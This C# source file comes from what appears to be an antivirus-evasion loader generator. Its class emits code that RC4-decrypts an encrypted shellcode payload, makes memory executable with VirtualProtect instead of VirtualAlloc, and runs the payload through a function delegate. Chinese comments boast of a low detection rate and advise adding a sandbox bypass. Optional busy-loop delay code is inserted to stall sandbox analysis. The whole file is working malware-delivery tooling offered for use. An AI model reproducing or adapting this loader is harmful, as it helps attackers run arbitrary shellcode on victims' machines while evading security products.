using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

//
// 直接执行shellcode的方法，但是不直接调用virtualalloc，所以查杀率也比较低，但还是推荐加个沙盒绕过
//
//需要两个参数，一是 key， 二是加密后的 shellcode。
//

namespace 掩日___免杀执行器生成工具
{
    class TP_VirtualProtect
    {
        string code;

        public TP_VirtualProtect(String decKey, String encPayload)
        {
            code = @"
using System;
using System.Collections.Generic;
using System.Deployment.Internal;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace CS_GetProcAddress
{
    class Program
    {
    public static byte[] xxxxxx(byte[] key, byte[] data)
    {
        return xxxxxxx(key, data).ToArray();
    }

    private static byte[] sDZi32(byte[] key)
    {
        byte[] s = Enumerable.Range(0, 256)
            .Select(i => (byte)i)
            .ToArray();

        for (int i = 0, j = 0; i < 256; i++)
        {
            j = (j + key[i % key.Length] + s[i]) & 255;

            xxx(s, i, j);
        }

        return s;
    }
    private static IEnumerable<byte> xxxxxxx(byte[] key, IEnumerable<byte> data)
    {
        byte[] s = sDZi32(key);

        int i = 0;
        int j = 0;

        return data.Select((b) =>
        {
            i = (i + 1) & 255;
            j = (j + s[i]) & 255;

            xxx(s, i, j);

            return (byte)(b ^ s[(s[i] + s[j]) & 255]);
        });
    }
    private static void xxx(byte[] s, int i, int j)
    {
        byte c = s[i];

        s[i] = s[j];
        s[j] = c;
    }
    [DllImport(""kernel32.dll"")]
    private static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

    private delegate UInt32 ShellcodeMethod(UInt32 x, UInt32 y);

    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    static void Main(string[] args)
    {
        //delay_code_here
        string xxxx = """ + encPayload + @""";
            string[] xxxx_Without_delimiterChar = xxxx.Split(',');
            byte[] _X_to_Bytes = new byte[xxxx_Without_delimiterChar.Length];
            for (int i = 0; i < xxxx_Without_delimiterChar.Length; i++)
            {
                byte current = Convert.ToByte(xxxx_Without_delimiterChar[i].ToString());
                _X_to_Bytes[i] = current;
            }
            byte[] KEY = {" + decKey + @"};
            byte[] shellcode = xxxxxx(KEY, _X_to_Bytes);

            IntPtr shellcodePtr = IntPtr.Zero;

            shellcodePtr = Marshal.AllocCoTaskMem(shellcode.Length);

            Marshal.Copy(shellcode, 0, shellcodePtr, shellcode.Length);

            UInt32 old;

            VirtualProtect(shellcodePtr, (UInt32)shellcode.Length, (UInt32)PAGE_EXECUTE_READWRITE, out old);

            ShellcodeMethod scm = (ShellcodeMethod)Marshal.GetDelegateForFunctionPointer(shellcodePtr, typeof(ShellcodeMethod));

            scm(4, 9);
    }
}
}";
        }

        public string GetCode()
        {
            //添加隐藏界面代码
            if (Global_Var.hidden)
            {

            }
            //添加延时代码
            if (Global_Var.delay != 0)
            {
                string delay_temp = @"int z;
for (int j = 0; j < " + Global_Var.delay.ToString() + @"; j++)
{ for (int i = 0; i < 1000000; i++)
		{
			Random rd = new Random();
			z = rd.Next();
			z++;
		}}";
                code = code.Replace(@"//delay_code_here", delay_temp);
            }
            return code;
        }

    }
}
